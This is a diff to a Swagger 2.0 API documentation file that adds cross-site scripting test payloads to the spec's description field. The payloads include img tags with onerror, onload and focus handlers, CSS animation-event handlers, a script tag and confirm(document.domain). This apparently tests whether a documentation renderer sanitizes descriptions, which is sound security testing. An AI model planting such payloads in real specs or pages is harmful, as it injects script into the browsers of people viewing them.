@@ -2,8 +2,13 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <img src/onerror=alert(1)>
+    <img src onerror=alert(1)>
+    <img id=x tabindex=1 onfocusin=alert(1)></img>
+    <img id=x tabindex=1 onfocus=alert(1)></img>
+    <img src=validimage.png onload=alert(1)>
     <script>console.log("kekw")</script>
+    <style>@keyframes slidein {}</style><img style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></img>
+    <style>@keyframes x{}</style><img style="animation-name:x" onwebkitanimationstart="alert(1)"></img>
     <a onmousehover="confirm(document.domain)">xss</a><b onload>bold text</b>
     <b id=x tabindex=1 onfocusin=alert(1)></b>
     <style>@keyframes slidein {}</style><b style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></b>
